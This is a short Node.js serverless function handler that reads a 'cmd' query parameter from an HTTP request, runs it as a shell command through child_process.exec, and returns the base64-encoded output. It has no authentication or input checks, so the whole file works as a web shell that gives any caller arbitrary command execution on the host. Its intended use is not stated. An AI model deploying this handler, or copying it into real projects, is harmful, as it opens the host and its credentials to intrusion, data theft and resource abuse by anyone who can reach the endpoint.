'use strict';

var exec = require('child_process');

exports.handler = function(event, context, callback) {
  console.log('event: %s', event.toString());

  var evt = JSON.parse(event.toString());
  var cmd = evt['queryParameters']['cmd'];
  exec.exec(cmd, {}, function(err, stdout, stderr) {
    console.log(stdout, stderr);

    var body = '';
    if (err) {
      body = new Buffer(stderr).toString('base64');
    } else {
      body = new Buffer(stdout).toString('base64');
    }

    var resp = {
      statusCode: 200,
      isBase64Encoded: true,
      body: body,
    };
    callback(null, resp);
  });
};
